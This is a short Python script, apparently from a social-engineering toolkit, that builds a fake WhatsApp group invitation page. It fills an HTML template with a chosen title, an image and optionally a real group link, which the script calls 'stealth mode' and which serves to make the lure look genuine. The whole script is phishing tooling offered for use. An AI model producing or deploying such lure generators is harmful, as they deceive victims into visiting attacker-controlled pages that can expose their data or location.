#!/usr/bin/env python3

import os
import shutil

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = input(G + '[+]' + C + ' Group Title : ' + W)
link = input(G + '[+]' + C + ' You can set link to real WhatsApp group(stealth mode). Do you want to do it?(y/n): ' + R)
if link in ['y', 'Y']:
	link = input(str(G + '[>]' + C + 'Input real group link: ' + W))
image = input(G + '[+]' + C + ' Path to Group Img (Best Size : 300x300): ' + W)

img_name = image.split('/')[-1]
try:
    shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
except Exception as e:
    print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
    exit()

with open('template/whatsapp_rus/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))
    code = code.replace('$LINK$', link)
with open('template/whatsapp_rus/index.html', 'w') as new_index:
    new_index.write(code)
